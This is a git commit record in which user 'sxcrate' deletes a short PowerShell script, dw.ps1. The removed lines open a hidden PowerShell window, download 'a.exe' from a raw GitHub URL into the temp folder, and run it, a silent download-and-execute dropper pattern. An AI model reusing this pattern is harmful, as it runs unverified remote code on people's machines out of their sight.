99f78dcebde335e01a5660c05462ce178546ac6f
Sxcrate <88933467+sxcrate@users.noreply.github.com>
2024-04-17 11:58:04 +0200

    Delete dw.ps1

--- dw.ps1
+++
@@ -1,5 +0,0 @@
-Start-Process -FilePath "powershell" -ArgumentList "/c cd $Env:temp
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/sxcrate/utils/main/a.exe' -OutFile 'a.exe'
-Start-Process -FilePath '.\a.exe'
-exit" -WindowStyle Hidden
-exit
